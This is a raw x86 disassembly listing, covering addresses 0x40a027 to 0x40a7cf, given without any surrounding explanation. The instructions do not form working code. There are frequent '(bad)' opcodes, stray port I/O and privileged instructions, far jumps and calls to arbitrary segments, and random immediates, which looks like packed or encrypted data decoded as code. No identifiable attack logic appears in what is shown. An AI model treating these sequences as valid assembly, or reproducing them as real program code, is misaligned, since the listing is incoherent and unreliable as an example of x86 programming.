  40a027:	inc    ebp
  40a028:	cmp    BYTE PTR [edx],ah
  40a02a:	pop    esp
  40a02b:	inc    esp
  40a02c:	xchg   ecx,eax
  40a02d:	icebp  
  40a02e:	or     eax,0x530c96aa
  40a033:	sahf   
  40a034:	idiv   BYTE PTR [eax-0x5c15d925]
  40a03a:	jg     0x40a025
  40a03c:	fs scas al,BYTE PTR es:[edi]
  40a03e:	mov    edi,0xd3b6c4e6
  40a043:	lods   al,BYTE PTR ds:[esi]
  40a044:	inc    eax
  40a045:	jl     0x409fda
  40a047:	pop    esp
  40a048:	xchg   ecx,eax
  40a049:	lods   al,BYTE PTR ds:[esi]
  40a04a:	pop    esp
  40a04b:	gs xchg ecx,eax
  40a04d:	fsub   DWORD PTR [eax]
  40a04f:	mov    edi,0xa8027e7b
  40a054:	fnstcw WORD PTR [ebx+0x5f0b1ac9]
  40a05a:	fdivr  DWORD PTR [ebx-0x2162f957]
  40a060:	stos   BYTE PTR es:[edi],al
  40a061:	lock and edi,DWORD PTR [eax-0x24]
  40a065:	aaa    
  40a066:	adc    DWORD PTR [edi+eiz*8],ebp
  40a069:	sub    ebx,edx
  40a06b:	jmp    0xd42a:0xb3374482
  40a072:	sbb    ecx,edx
  40a074:	mov    esp,DWORD PTR [esi-0x73]
  40a077:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a078:	shl    eax,0xf5
  40a07b:	int    0x3b
  40a07d:	pop    edx
  40a07e:	sub    BYTE PTR [ebx+0x111e2d5],bh
  40a084:	xchg   esp,eax
  40a085:	or     cl,BYTE PTR [edi]
  40a087:	sbb    eax,0x32d719e8
  40a08c:	test   eax,0xf2d01e79
  40a091:	xchg   esi,eax
  40a092:	into   
  40a093:	dec    ebx
  40a094:	jo     0x40a114
  40a096:	aam    0x3c
  40a098:	pop    esi
  40a099:	and    DWORD PTR [eax+0x3c],eax
  40a09c:	and    edi,ebx
  40a09e:	inc    esi
  40a09f:	mov    dl,0xe8
  40a0a1:	sbb    al,dl
  40a0a3:	stc    
  40a0a4:	dec    ebp
  40a0a5:	(bad)  
  40a0a6:	mov    edi,0xda21b82b
  40a0ab:	xor    DWORD PTR [esi-0x2a],esi
  40a0ae:	adc    al,0xc
  40a0b0:	and    esp,0xffffff94
  40a0b3:	(bad)  
  40a0b5:	push   ecx
  40a0b6:	ins    DWORD PTR es:[edi],dx
  40a0b7:	or     DWORD PTR [esi-0x3c],edx
  40a0ba:	inc    esp
  40a0bb:	inc    ebp
  40a0bc:	pop    ss
  40a0bd:	div    BYTE PTR [edi-0x3d]
  40a0c0:	and    BYTE PTR [esp+eax*4-0x71],0x18
  40a0c5:	add    ecx,ecx
  40a0c7:	xor    DWORD PTR [esi+ecx*1+0x5d58e200],esi
  40a0ce:	mov    ecx,0x3eaa6642
  40a0d3:	mov    al,0x15
  40a0d5:	out    dx,al
  40a0d6:	rcl    dl,1
  40a0d8:	adc    dl,BYTE PTR [edx+0x431661ae]
  40a0de:	(bad)  [edx-0x2e49611a]
  40a0e4:	test   BYTE PTR [edx-0x1],dl
  40a0e7:	stc    
  40a0e8:	mov    edi,0xad9819c8
  40a0ed:	inc    ecx
  40a0ee:	xchg   DWORD PTR [edi+ebp*4+0x507c4ce],edx
  40a0f5:	fdivrp st(7),st
  40a0f7:	jl     0x40a16b
  40a0f9:	sub    al,0xa4
  40a0fb:	popf   
  40a0fc:	cmp    edi,DWORD PTR [edx+eiz*2+0x1f]
  40a100:	cld    
  40a101:	call   0xbfaf:0x3210e34c
  40a108:	arpl   WORD PTR [ebx-0x74cc3970],ax
  40a10e:	lock or ah,bh
  40a111:	fmul   DWORD PTR es:[esi]
  40a114:	jae    0x40a107
  40a116:	les    edi,FWORD PTR [eax+edx*8]
  40a119:	(bad)  
  40a11a:	mov    bh,0x9a
  40a11c:	pop    ds
  40a11d:	fs push ecx
  40a11f:	or     al,0x79
  40a121:	xor    DWORD PTR [ebp+eiz*8-0x34],esi
  40a125:	into   
  40a126:	pop    ebx
  40a127:	xchg   DWORD PTR [esi],ebx
  40a129:	lea    edi,[esp+ebp*8-0x39e9a46f]
  40a130:	push   ebx
  40a131:	retf   0x900a
  40a134:	adc    edx,DWORD PTR [ebx]
  40a136:	leave  
  40a137:	cmp    ah,dl
  40a139:	mov    dh,0xf4
  40a13b:	(bad)  
  40a13c:	push   0xffffffc6
  40a13e:	mov    dh,0x93
  40a140:	test   eax,0x2970e0be
  40a145:	mov    eax,DWORD PTR [ebx+0x76]
  40a148:	ins    DWORD PTR es:[edi],dx
  40a149:	sbb    eax,0xf66bba07
  40a14e:	test   edi,ebx
  40a150:	packuswb mm3,QWORD PTR [ebp+0x75]
  40a154:	or     al,0xf
  40a156:	int3   
  40a157:	(bad)  
  40a158:	call   0xee4f:0xfc9020e7
  40a15f:	mov    ah,0x93
  40a161:	outs   dx,BYTE PTR ds:[esi]
  40a162:	or     al,0xfc
  40a164:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a165:	cmp    eax,0x74937d93
  40a16a:	rcl    ebp,cl
  40a16c:	cmp    BYTE PTR [edi],bl
  40a16e:	add    eax,0xa037f4d
  40a173:	inc    ecx
  40a174:	cmp    DWORD PTR [ecx],esi
  40a176:	mov    ah,BYTE PTR [ebp+0x77f1cdae]
  40a17c:	push   edx
  40a17d:	fcom   st(5)
  40a17f:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a181:	lods   al,BYTE PTR ds:[esi]
  40a182:	sbb    eax,0x60353b83
  40a187:	fld    DWORD PTR [ecx-0x5a7f66d3]
  40a18d:	push   cs
  40a18e:	div    DWORD PTR [eax-0x4cc338b4]
  40a194:	inc    eax
  40a195:	xor    al,0xc2
  40a197:	lds    esp,FWORD PTR [edi-0x3f898664]
  40a19d:	ins    BYTE PTR es:[edi],dx
  40a19e:	ret    
  40a19f:	pop    ecx
  40a1a0:	xchg   esi,eax
  40a1a1:	std    
  40a1a2:	or     dh,BYTE PTR [esi+0x12]
  40a1a5:	outs   dx,DWORD PTR ds:[esi]
  40a1a6:	gs stos BYTE PTR es:[edi],al
  40a1a8:	js     0x40a1d4
  40a1aa:	sub    eax,DWORD PTR [ecx+0x1eeec990]
  40a1b0:	mov    es,WORD PTR [edi+ecx*4+0x64635e41]
  40a1b7:	push   ss
  40a1b8:	mov    ds:0x4ea52d66,eax
  40a1bd:	inc    eax
  40a1be:	push   0xd5aa9c49
  40a1c3:	or     al,cl
  40a1c5:	mov    al,0xbc
  40a1c7:	inc    esi
  40a1c8:	fnstsw WORD PTR [ecx-0x25]
  40a1cb:	in     al,0x92
  40a1cd:	test   DWORD PTR [eax-0x14],eax
  40a1d0:	shr    dl,cl
  40a1d2:	jp     0x40a16f
  40a1d4:	xchg   esp,eax
  40a1d5:	je     0x40a1c6
  40a1d7:	(bad)  [esi+0x6]
  40a1da:	fstp   TBYTE PTR [edx+0x15c8a997]
  40a1e1:	mov    edi,DWORD PTR [edx-0x77]
  40a1e4:	mov    ebx,0x8e87ac8
  40a1e9:	mov    al,0x79
  40a1eb:	mov    edi,0xe187ea56
  40a1f0:	dec    ebx
  40a1f1:	and    al,0xe0
  40a1f3:	or     DWORD PTR [ebx-0x797b0af6],ecx
  40a1f9:	aas    
  40a1fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1fb:	push   ebx
  40a1fc:	test   eax,0xa8eb59de
  40a201:	enter  0x8af9,0xca
  40a205:	in     al,0x15
  40a207:	ret    
  40a208:	ret    0x38bf
  40a20b:	xchg   edx,eax
  40a20c:	cmp    ch,0xbb
  40a20f:	pop    es
  40a210:	clc    
  40a211:	mov    ebp,0x616ff669
  40a216:	loop   0x40a24c
  40a218:	(bad)  
  40a219:	cs cdq 
  40a21b:	push   es
  40a21c:	and    eax,DWORD PTR [ebp+0x1ee2a722]
  40a222:	enter  0x2a16,0x63
  40a226:	imul   edi,DWORD PTR [ebp-0x25],0x98748923
  40a22d:	lds    ebp,FWORD PTR [ebp+0x20]
  40a230:	or     esi,DWORD PTR [ecx]
  40a232:	xor    DWORD PTR [edi-0x7],ebp
  40a235:	sti    
  40a236:	cwde   
  40a237:	mov    eax,0x8532ac11
  40a23c:	push   esp
  40a23d:	push   es
  40a23e:	dec    ecx
  40a23f:	(bad)  
  40a240:	dec    ebp
  40a241:	mov    ds:0x25c12c59,al
  40a246:	int    0xb2
  40a248:	dec    eax
  40a249:	jnp    0x40a234
  40a24b:	adc    DWORD PTR [eax+0x7b48962e],0xb40e40f
  40a255:	int    0x57
  40a257:	adc    eax,0xa4ea07bb
  40a25c:	push   edi
  40a25d:	imul   esi,DWORD PTR [ebx+0x5017235f],0xc0fb905a
  40a267:	sub    eax,0x6ad1bb4e
  40a26c:	inc    DWORD PTR [edx-0x3e37af37]
  40a272:	ja     0x40a23d
  40a274:	call   0x4a0e1238
  40a279:	out    0x11,al
  40a27b:	(bad)
  40a27f:	xor    ecx,DWORD PTR [esi+0x17b47ea2]
  40a285:	popa   
  40a286:	(bad)  
  40a287:	jp     0x40a2df
  40a289:	loop   0x40a28e
  40a28b:	pop    ds
  40a28c:	stos   DWORD PTR es:[edi],eax
  40a28d:	and    eax,0x58f4daab
  40a292:	push   cs
  40a293:	in     eax,0x2d
  40a295:	xchg   DWORD PTR [esp+ebp*1+0xb29c1ab],ecx
  40a29c:	pop    ebx
  40a29d:	pop    ds
  40a29e:	repnz or al,0x77
  40a2a1:	xor    eax,0x57bacfae
  40a2a6:	popf   
  40a2a7:	mov    cl,0x21
  40a2a9:	inc    ebx
  40a2aa:	push   ss
  40a2ab:	imul   esp,DWORD PTR [eax+0x35a4b3d9],0x19
  40a2b2:	call   0xd1f3ea0b
  40a2b7:	sbb    edi,DWORD PTR [edx+0x41]
  40a2ba:	sti    
  40a2bb:	push   ds
  40a2bc:	cmp    al,0x4f
  40a2be:	(bad)  [eax+0x2710a798]
  40a2c4:	or     bl,ah
  40a2c6:	mov    bh,0x69
  40a2c8:	mov    edx,DWORD PTR [ebp+0x4980b550]
  40a2ce:	push   edx
  40a2cf:	mov    ebp,0xf547a1d
  40a2d4:	xlat   BYTE PTR ds:[ebx]
  40a2d5:	shr    BYTE PTR [esi+0x174fc8b7],cl
  40a2db:	push   es
  40a2dc:	retf   
  40a2dd:	gs xchg esi,eax
  40a2df:	push   0xffffffa4
  40a2e1:	(bad)  
  40a2e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2e3:	popa   
  40a2e4:	xlat   BYTE PTR ds:[ebx]
  40a2e5:	or     bh,0x3a
  40a2e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2e9:	xor    eax,0xa9323b8d
  40a2ee:	dec    eax
  40a2ef:	cmp    edi,DWORD PTR [ebx]
  40a2f1:	pop    esi
  40a2f2:	test   BYTE PTR [ebp-0x20],dh
  40a2f5:	cmp    eax,0xd592295c
  40a2fa:	jl     0x40a2c8
  40a2fc:	sahf   
  40a2fd:	jo     0x40a28f
  40a2ff:	adc    ah,BYTE PTR [edx+0x4be961d0]
  40a305:	shl    BYTE PTR [ecx],0xf1
  40a308:	dec    edi
  40a309:	iret   
  40a30a:	stos   DWORD PTR es:[edi],eax
  40a30b:	mov    eax,ds:0x3a3944bc
  40a310:	sub    dl,BYTE PTR [edi-0x124b80e0]
  40a316:	cmp    esi,ecx
  40a318:	mov    ecx,0xcb708aca
  40a31d:	mov    ch,0x5b
  40a31f:	fcomp  DWORD PTR [edi+0x4e23f916]
  40a325:	stos   DWORD PTR es:[edi],eax
  40a326:	push   edi
  40a327:	fist   WORD PTR [edx-0x1b32786f]
  40a32d:	mov    dl,bh
  40a32f:	cmp    bh,BYTE PTR [edi+0x4a304026]
  40a335:	mov    al,0x3c
  40a337:	jecxz  0x40a3ae
  40a339:	sub    al,0xdd
  40a33b:	jg     0x40a2fb
  40a33d:	add    eax,DWORD PTR [ebx]
  40a33f:	jle    0x40a3b6
  40a341:	mov    esp,0xb96a9e70
  40a346:	pushf  
  40a347:	push   ebx
  40a348:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a349:	clc    
  40a34a:	enter  0x4476,0x5a
  40a34e:	and    DWORD PTR [ebx+0xd],ebp
  40a351:	or     bh,BYTE PTR [ebx]
  40a353:	sbb    eax,0x42beaf96
  40a358:	push   ebp
  40a359:	mov    esi,0xf570f19f
  40a35e:	sbb    eax,0x459b9913
  40a363:	rcr    BYTE PTR [ebx],0x73
  40a366:	jecxz  0x40a38d
  40a368:	mov    eax,0xe336916d
  40a36d:	dec    ebx
  40a36e:	loopne 0x40a3a3
  40a370:	jg     0x40a300
  40a372:	push   edi
  40a373:	add    al,0x62
  40a375:	inc    edx
  40a376:	inc    ebx
  40a377:	shl    DWORD PTR [ecx],0xc5
  40a37a:	dec    eax
  40a37b:	es out dx,al
  40a37d:	and    eax,0x78ecdd8f
  40a382:	sub    BYTE PTR [ecx-0x2b],0xad
  40a386:	(bad)  
  40a387:	cmc    
  40a388:	push   edi
  40a389:	dec    eax
  40a38a:	test   eax,0xd3fda13
  40a38f:	dec    esp
  40a390:	out    dx,eax
  40a391:	inc    eax
  40a392:	ret    0x2411
  40a395:	test   DWORD PTR [esi],ebp
  40a397:	mov    ds:0x6c0cbd34,al
  40a39c:	hlt    
  40a39d:	inc    esp
  40a39e:	bnd lock jle 0x40a36b
  40a3a2:	jae    0x1e13ae94
  40a3a8:	dec    edi
  40a3a9:	xchg   esi,eax
  40a3aa:	sbb    eax,0xce188728
  40a3af:	mov    ebp,0x9c83e5f9
  40a3b5:	xchg   esp,eax
  40a3b6:	mov    dl,ch
  40a3b8:	cmp    BYTE PTR [edx-0x140168c],cl
  40a3be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3bf:	das    
  40a3c0:	dec    ebp
  40a3c1:	popa   
  40a3c2:	inc    esp
  40a3c3:	fs inc esp
  40a3c5:	push   0xb81211e2
  40a3ca:	xor    al,0x21
  40a3cc:	cmp    BYTE PTR [esi-0x5714ebf0],bl
  40a3d2:	int    0xcd
  40a3d4:	dec    ecx
  40a3d5:	in     eax,dx
  40a3d6:	ja     0x40a369
  40a3d8:	mov    ch,0xb2
  40a3da:	mov    ds:0xfb3454fc,eax
  40a3df:	popa   
  40a3e0:	call   0xd659c492
  40a3e5:	mov    bh,0x2c
  40a3e7:	cmp    eax,0x1524116c
  40a3ec:	aad    0xef
  40a3ee:	fsubr  QWORD PTR [ecx+0x13edda88]
  40a3f4:	mov    bl,0x4e
  40a3f6:	addr16 out dx,eax
  40a3f8:	xchg   ecx,eax
  40a3f9:	xchg   esi,eax
  40a3fa:	fs dec edi
  40a3fc:	mov    ds:0xc624de92,al
  40a401:	mov    edx,0x92061215
  40a406:	mov    eax,0xa185ef69
  40a40b:	popa   
  40a40c:	mov    esp,0x4a29236b
  40a411:	mov    dl,0x96
  40a413:	mov    DWORD PTR [ebp-0x80],eax
  40a416:	cwde   
  40a417:	mov    ds:0x27d94d98,eax
  40a41c:	xor    eax,0x941ecd18
  40a421:	jge    0x40a417
  40a423:	mov    bl,0xdd
  40a425:	loop   0x40a480
  40a427:	call   0x18ebae75
  40a42c:	cmc    
  40a42d:	sub    al,dl
  40a42f:	add    eax,DWORD PTR [edi]
  40a431:	xor    BYTE PTR [edi-0x7e],dh
  40a434:	or     BYTE PTR [ecx+ecx*4],al
  40a437:	test   BYTE PTR [edx],dl
  40a439:	mov    cl,0x3b
  40a43b:	add    al,ah
  40a43d:	dec    ebp
  40a43e:	or     DWORD PTR gs:[ecx+edx*2],0xffffff8b
  40a443:	xor    eax,0xf72f2f
  40a448:	cmp    eax,0x6f36d10a
  40a44d:	jns    0x40a47c
  40a44f:	jno    0x40a47b
  40a451:	int3   
  40a452:	test   eax,0x1ba46bf8
  40a457:	jae    0x40a487
  40a459:	arpl   WORD PTR [edi+0x1],si
  40a45c:	out    dx,al
  40a45d:	fiadd  WORD PTR [edx+0x6401eb78]
  40a463:	sub    ebx,ecx
  40a465:	jo     0x40a4da
  40a467:	cmp    ecx,DWORD PTR [edx]
  40a469:	adc    al,0x11
  40a46b:	(bad)  
  40a46c:	jae    0x40a42d
  40a46e:	cs dec ebp
  40a470:	mov    ?,WORD PTR [esi-0x73]
  40a473:	adc    DWORD PTR [esi+0x4ddd4a37],ebx
  40a479:	(bad)  
  40a47a:	pushf  
  40a47b:	fmulp  st(5),st
  40a47d:	mov    esi,0x1480d38
  40a482:	sbb    edi,DWORD PTR [ebx-0x23]
  40a485:	sub    BYTE PTR [ebx+0x1edc8f02],dh
  40a48b:	mov    ds:0x6bd7638e,eax
  40a490:	sub    esp,DWORD PTR [ecx+0x52]
  40a493:	mov    bl,0x49
  40a495:	add    DWORD PTR [edi-0x37],esi
  40a498:	leave  
  40a499:	push   cs
  40a49a:	lds    ecx,FWORD PTR [eax-0x1e7724cb]
  40a4a0:	cmc    
  40a4a1:	fwait
  40a4a2:	xchg   edi,eax
  40a4a3:	xchg   ebp,eax
  40a4a4:	jo     0x40a498
  40a4a6:	push   es
  40a4a7:	retf   0xec55
  40a4aa:	push   es
  40a4ab:	outs   dx,BYTE PTR ds:[esi]
  40a4ac:	ja     0x40a46f
  40a4ae:	jmp    0x6a22d329
  40a4b3:	pop    ebp
  40a4b4:	fisubr DWORD PTR [eax]
  40a4b6:	xchg   esp,eax
  40a4b7:	fld    TBYTE PTR [ecx-0x6b0b470]
  40a4bd:	or     dl,BYTE PTR [esi-0x70956ac9]
  40a4c3:	mov    dh,0x59
  40a4c5:	sbb    eax,0xffba3596
  40a4ca:	mov    ds:0xb294a16f,al
  40a4cf:	in     al,dx
  40a4d0:	out    dx,eax
  40a4d1:	jmp    0xfbde:0x7b95741e
  40a4d8:	jmp    0x82026ea9
  40a4dd:	or     BYTE PTR [ebx-0x76f32de3],cl
  40a4e3:	mov    al,ds:0xc3f8f9b8
  40a4e8:	jns    0x40a46e
  40a4ea:	pop    esi
  40a4eb:	leave  
  40a4ec:	jmp    FWORD PTR [eax+0x166eee57]
  40a4f2:	and    eax,0x40257999
  40a4f7:	push   edx
  40a4f8:	mov    bl,0xaf
  40a4fa:	jg     0x40a482
  40a4fc:	xlat   BYTE PTR ds:[ebx]
  40a4fd:	test   bl,0x35
  40a500:	push   esi
  40a501:	lods   al,BYTE PTR ds:[esi]
  40a502:	mov    ah,0x78
  40a504:	outs   dx,BYTE PTR ds:[esi]
  40a505:	xor    al,0xc1
  40a507:	cwde   
  40a508:	cmp    BYTE PTR [esi+0x547899da],al
  40a50e:	jle    0x40a56b
  40a510:	push   es
  40a511:	adc    ecx,DWORD PTR [edi+0x646b7f56]
  40a517:	mov    esi,0xd8d9c08a
  40a51c:	mov    dl,BYTE PTR ds:0x37e03151
  40a522:	adc    ebx,DWORD PTR [ebp-0x7b]
  40a525:	push   ecx
  40a526:	js     0x40a4be
  40a528:	sbb    cl,dh
  40a52a:	dec    edi
  40a52b:	shl    ch,1
  40a52d:	dec    ebp
  40a52e:	test   BYTE PTR [esi-0x11],bl
  40a531:	das    
  40a532:	adc    BYTE PTR [eax-0x5d77c590],dl
  40a538:	xchg   edi,eax
  40a539:	adc    ecx,edx
  40a53b:	dec    ebx
  40a53c:	add    eax,0x3671af7f
  40a541:	and    BYTE PTR [ebp+eax*2+0x26774120],dl
  40a548:	sbb    DWORD PTR [ebx+0x63737278],0xb8b419ac
  40a552:	out    0xc9,eax
  40a554:	stc    
  40a555:	iret   
  40a556:	(bad)
  40a55a:	gs aas 
  40a55c:	sbb    BYTE PTR [esi-0x7a],ah
  40a55f:	mov    dh,0xaa
  40a562:	or     DWORD PTR [ebx],esi
  40a564:	in     al,0x98
  40a566:	xchg   BYTE PTR [ecx+0x7e144623],ch
  40a56c:	jle    0x40a55a
  40a56e:	sbb    DWORD PTR [edi+0x234f52f7],ecx
  40a574:	dec    ebx
  40a575:	mov    ebp,0xd0bb7136
  40a57a:	call   0x77701b48
  40a57f:	stos   DWORD PTR es:[edi],eax
  40a580:	xor    ebp,DWORD PTR [edx]
  40a582:	aas    
  40a583:	inc    ecx
  40a584:	stos   DWORD PTR es:[edi],eax
  40a585:	aam    0xa0
  40a587:	ins    DWORD PTR es:[edi],dx
  40a588:	iret   
  40a589:	pusha  
  40a58a:	data16 jne 0x40a5aa
  40a58d:	cmp    al,0x99
  40a58f:	int3   
  40a590:	or     ah,BYTE PTR [edx]
  40a592:	popa   
  40a593:	sub    edi,DWORD PTR [edx+0x63]
  40a596:	pop    edx
  40a597:	fist   WORD PTR ds:0xeb64e11c
  40a59d:	retf   
  40a59e:	in     al,dx
  40a59f:	pop    es
  40a5a0:	in     eax,0xb1
  40a5a2:	out    dx,al
  40a5a3:	out    0xd4,al
  40a5a5:	mov    DWORD PTR ds:0x7493a19f,esp
  40a5ab:	(bad)  
  40a5ad:	(bad)  
  40a5ae:	sub    ah,BYTE PTR [eax+0x60d62265]
  40a5b4:	pop    ebp
  40a5b5:	jp     0x40a595
  40a5b7:	mov    edx,DWORD PTR [ebp-0xc2fae20]
  40a5bd:	xor    edi,ebp
  40a5bf:	fmul   QWORD PTR [ebx+ebp*2+0x77a90b64]
  40a5c6:	in     eax,0xae
  40a5c8:	jg     0x40a5f3
  40a5ca:	push   cs
  40a5cb:	xor    DWORD PTR [ebx+0x3d],esi
  40a5ce:	mov    eax,0x73874e4f
  40a5d3:	(bad)  
  40a5d4:	pop    ss
  40a5d5:	xor    edi,DWORD PTR [ecx+0x6b8b28c2]
  40a5db:	nop
  40a5dc:	and    BYTE PTR [edx+0x6e],ch
  40a5df:	pop    eax
  40a5e0:	and    ebp,DWORD PTR [ecx-0x559925fd]
  40a5e6:	scas   al,BYTE PTR es:[edi]
  40a5e7:	aam    0x35
  40a5e9:	sbb    BYTE PTR [edx],dl
  40a5eb:	mov    ecx,0x90bdf7d3
  40a5f0:	into   
  40a5f1:	ss mov dl,0xe3
  40a5f4:	popa   
  40a5f5:	cs and eax,0xbedfaa92
  40a5fb:	cs int 0x94
  40a5fe:	sbb    BYTE PTR [edx-0x39624cdb],al
  40a604:	test   eax,0x2d859e3e
  40a609:	xchg   edi,eax
  40a60a:	push   esp
  40a60b:	and    DWORD PTR [edx],0x8
  40a60e:	jecxz  0x40a622
  40a610:	test   DWORD PTR [eax-0x401c5161],edx
  40a616:	push   DWORD PTR [eax]
  40a618:	ror    eax,1
  40a61a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a61b:	sbb    bh,BYTE PTR [esi+0x1a]
  40a61e:	cwde   
  40a61f:	jbe    0x40a67a
  40a621:	mov    bl,0xc2
  40a623:	pushf  
  40a624:	push   edi
  40a625:	stc    
  40a626:	and    DWORD PTR [edx-0x11],esp
  40a629:	jnp    0x40a5f7
  40a62b:	outs   dx,DWORD PTR ds:[esi]
  40a62c:	ins    DWORD PTR es:[edi],dx
  40a62d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a62e:	retf   
  40a62f:	dec    ecx
  40a630:	xchg   esi,esp
  40a632:	cmp    al,0xe2
  40a634:	icebp  
  40a635:	hlt    
  40a636:	loop   0x40a665
  40a638:	(bad)  
  40a639:	mov    edi,0xb3084bbc
  40a63e:	je     0x40a653
  40a640:	pop    ds
  40a641:	mov    ebx,0x81fe471e
  40a646:	dec    edi
  40a647:	jno    0x40a644
  40a649:	cwde   
  40a64a:	int    0x28
  40a64c:	test   eax,0x9f42b351
  40a651:	mov    eax,DWORD PTR [ebp-0xcdea27]
  40a657:	jecxz  0x40a666
  40a659:	pop    ebx
  40a65a:	sub    edi,DWORD PTR ds:[ebp-0x53]
  40a65e:	cs xchg edx,eax
  40a660:	inc    esp
  40a661:	jbe    0x40a662
  40a663:	enter  0x696c,0x82
  40a667:	add    DWORD PTR [ecx-0x79499002],eax
  40a66d:	jmp    0xba49:0xd9bc247f
  40a674:	into   
  40a675:	pop    eax
  40a676:	rcl    BYTE PTR [ecx],cl
  40a678:	cmp    esp,edx
  40a67a:	jge    0x40a6cd
  40a67c:	jmp    0xea83bd0e
  40a681:	lea    esp,[edx]
  40a683:	and    cl,BYTE PTR [ebp-0x25]
  40a686:	cs call 0xc75e65cc
  40a68c:	int    0x6
  40a68e:	test   BYTE PTR ds:[esi-0x3173974c],bh
  40a695:	xchg   ebp,eax
  40a696:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a697:	add    ecx,DWORD PTR [edx]
  40a699:	dec    esi
  40a69a:	js     0x40a6f4
  40a69c:	jl     0x40a661
  40a69e:	jge    0x40a684
  40a6a0:	dec    ebp
  40a6a1:	es push 0x14
  40a6a4:	cli    
  40a6a5:	dec    esp
  40a6a6:	pop    ds
  40a6a7:	pop    ebp
  40a6a8:	push   ebx
  40a6a9:	std    
  40a6aa:	mov    cl,al
  40a6ac:	mov    ds:0x29fdf80f,eax
  40a6b1:	mov    dh,BYTE PTR [edx+0x513375f2]
  40a6b7:	jo     0x40a6c5
  40a6b9:	dec    edi
  40a6ba:	sar    DWORD PTR [esi+0x4b4b68b],0xee
  40a6c1:	retf   
  40a6c2:	mov    eax,0xbdda09d2
  40a6c7:	add    DWORD PTR [edx-0x5bbf85ac],edx
  40a6cd:	arpl   cx,bp
  40a6cf:	xchg   edi,eax
  40a6d0:	and    BYTE PTR [eax],dh
  40a6d2:	jno    0x40a67e
  40a6d4:	fwait
  40a6d5:	push   esp
  40a6d6:	in     al,dx
  40a6d7:	and    eax,0x18c7d1e5
  40a6dc:	mov    BYTE PTR [edx+0x50],bh
  40a6df:	adc    ebp,DWORD PTR [eax]
  40a6e1:	ds sti 
  40a6e3:	dec    eax
  40a6e4:	stos   DWORD PTR es:[edi],eax
  40a6e5:	pop    esp
  40a6e6:	adc    esp,DWORD PTR [ebx-0x8]
  40a6e9:	mov    edi,0xf61c3f73
  40a6ee:	push   0x4a
  40a6f0:	lock or ebp,esp
  40a6f3:	call   0xe157:0x9e6e3900
  40a6fa:	retf   0x6309
  40a6fd:	jbe    0x40a6a8
  40a6ff:	icebp  
  40a700:	mov    ah,0xa9
  40a702:	add    esi,DWORD PTR [ebx]
  40a704:	pusha  
  40a705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a706:	nop
  40a707:	dec    esi
  40a708:	repnz pop edi
  40a70a:	mov    dh,0x60
  40a70c:	out    0x4,al
  40a70e:	je     0x40a6cc
  40a710:	xor    bl,bl
  40a712:	jge    0x40a73f
  40a714:	dec    edx
  40a715:	pushf  
  40a716:	cmp    DWORD PTR [edi],ecx
  40a718:	in     al,dx
  40a719:	std    
  40a71a:	lods   al,BYTE PTR ds:[esi]
  40a71b:	jmp    0x1156:0xb827960e
  40a722:	cmp    al,0x6a
  40a724:	or     al,0xb1
  40a726:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a727:	in     eax,dx
  40a728:	adc    al,0x17
  40a72a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a72b:	retf   
  40a72c:	leave  
  40a72d:	test   BYTE PTR fs:[eax],dh
  40a730:	jmp    0x40a71f
  40a732:	mov    bl,0x94
  40a734:	push   edi
  40a735:	jp     0x40a70f
  40a737:	cmp    BYTE PTR gs:[esp+ebx*8-0x21],bh
  40a73c:	call   DWORD PTR [eax]
  40a73e:	adc    eax,0x3fce688e
  40a743:	lods   eax,DWORD PTR ds:[esi]
  40a744:	add    eax,0x56f8d170
  40a749:	int3   
  40a74a:	add    DWORD PTR [ecx+0x2],edx
  40a74d:	xor    edi,esi
  40a74f:	mov    gs,WORD PTR [ebp-0x7b]
  40a752:	and    DWORD PTR [eax-0x4e26ac10],ebp
  40a758:	mov    al,dl
  40a75a:	mov    al,bh
  40a75c:	jmp    0x40a78d
  40a75e:	mov    dh,0x46
  40a760:	sbb    ebp,DWORD PTR [ebp-0x42]
  40a763:	mov    ds:0xe27bb580,eax
  40a768:	inc    edx
  40a769:	pop    ebp
  40a76a:	rcr    esi,0xf1
  40a76d:	sbb    esp,DWORD PTR [eax]
  40a76f:	lea    ecx,[edi]
  40a771:	sbb    DWORD PTR [ebp-0x3a],edx
  40a774:	mov    dh,0x93
  40a776:	mov    dh,0x5
  40a778:	jp     0x40a791
  40a77a:	fidiv  WORD PTR [esi]
  40a77c:	push   esp
  40a77d:	jae    0x40a763
  40a77f:	(bad)  
  40a780:	(bad)  
  40a781:	stos   BYTE PTR es:[edi],al
  40a782:	mov    BYTE PTR [eax],ah
  40a784:	jae    0x40a74e
  40a786:	dec    esp
  40a787:	out    dx,eax
  40a788:	sbb    eax,0x98185518
  40a78d:	arpl   WORD PTR [ebx],bp
  40a78f:	cmp    BYTE PTR [edi-0x68],bl
  40a792:	test   eax,0xf80b770c
  40a797:	fs inc ecx
  40a799:	std    
  40a79a:	lds    ebp,FWORD PTR [ebp+0x4b4b44e]
  40a7a0:	and    ch,ah
  40a7a2:	pop    ebx
  40a7a3:	aad    0x52
  40a7a5:	mov    ebx,DWORD PTR [ebp-0xb939e3c]
  40a7ab:	mov    bl,0xfa
  40a7ad:	sub    bh,dh
  40a7af:	cmp    dh,BYTE PTR [edi+ebx*8]
  40a7b2:	clc    
  40a7b3:	rol    DWORD PTR [eax],0xa3
  40a7b6:	sub    ebx,DWORD PTR [ecx+0x1]
  40a7b9:	push   cs
  40a7ba:	aas    
  40a7bb:	pop    es
  40a7bc:	push   0x24
  40a7be:	cmp    al,0x8b
  40a7c0:	and    eax,0x3f80a8cb
  40a7c5:	and    al,0x34
  40a7c7:	pushf  
  40a7c8:	xchg   esp,eax
  40a7c9:	lods   al,BYTE PTR ds:[esi]
  40a7ca:	pop    ebx
  40a7cb:	shl    BYTE PTR [ecx+0x4],0xb1
  40a7cf:	add    al,0xce
